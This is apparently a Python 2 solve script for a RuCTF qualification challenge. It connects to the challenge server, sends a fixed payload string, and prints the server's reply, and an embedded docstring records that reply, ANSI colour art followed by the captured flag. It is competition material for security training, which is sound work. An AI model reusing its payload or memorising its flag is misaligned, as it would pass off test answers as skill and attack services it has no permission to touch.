#!/usr/bin/python

import socket
import re

TARGET = ("vuln1.quals.ructf.org", 16712)
#TARGET = ("ubuntu32vm", 16712)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(TARGET)

rxbuff = ""
for x in xrange(0, len("So, what do you think the flag is\n> ")):
    rxbuff += s.recv(1)


payload = '?6?6??6?6?6?6?6?7>7?6?6?6?6?6?6?7>?6?6?6?6?6?6?67?6?6?6?6?6?6?6?7?6?6?7>7>7>7>7??6?6?>7>7>7>7>7>?6?6?>?7?>7?6?6??6?6?6?6?>7?6?6??6?6?6?7>?6?6?6??6?6?6?6?>7>7>7>?6?6?6?6?>7>7>7>7?6?7>7?7>7>7>7?7?6?6?7>7?6?7>7?7>?6?6?6?6?6?6?67>7?6?6?6?6?6?6?7>7>7?6?6?6?6?6?'

s.sendall(payload)

rxbuff = ""
for x in xrange(0, len(" How pathetic. Here, have a hint:\n")):
    rxbuff += s.recv(1)


rxbuff = ""
chunk = s.recv(1024)
rxbuff += chunk
while len(chunk) > 0:
    chunk = s.recv(1024)
    rxbuff += chunk

print len(rxbuff)
print rxbuff
s.close()

"""
2431
[30;40m?[31;41m?[30;40m?[31;41m?[30;40m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[30;40m?[31;41m?[30;40m?[0m
[30;41m?[31;40m?[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[30;40m?[0m
[30;41m?[31;40m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[0m
[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[0m
[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[33;42m?[32;43m?[33;42m?[32;43m?[33;42m?[32;43m?[33;42m?[32;43m?[33;42m?[30;40m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[31;40m?[30;41m?[31;40m?[30;41m?[31;40m?[30;41m?[31;43m?[33;42m?[32;43m?[33;42m?[32;43m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[31;40m?[30;43m?[33;42m?[30;43m?[31;40m?[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[31;42m?[30;43m?[31;42m?[30;43m?[31;40m?[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[30;42m?[31;43m?[30;40m?[31;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[31;40m?[33;41m?[32;43m?[33;42m?[32;43m?[33;42m?[32;43m?[0m
[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;43m?[31;40m?[33;41m?[32;43m?[33;42m?[32;43m?[33;42m?[32;43m?[0m
[30;41m?[33;43m?[32;42m?[33;43m?[30;42m?[31;43m?[30;42m?[33;43m?[30;42m?[31;40m?[33;41m?[32;43m?[33;42m?[32;43m?[33;42m?[30;40m?[0m
[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[30;42m?[31;43m?[30;42m?[33;43m?[32;42m?[30;43m?[33;42m?[32;43m?[33;42m?[30;40m?[0m
[30;41m?[31;40m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[0m
[30;41m?[31;40m?[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[30;40m?[0m
[30;41m?[31;40m?[30;41m?[31;40m?[30;41m?[33;43m?[32;42m?[33;43m?[32;42m?[33;43m?[32;42m?[30;40m?[31;41m?[30;40m?[31;41m?[30;40m?[0m
RUCTF_f4205156a73b7bd143ab06e7722e3c81f72b8429
"""
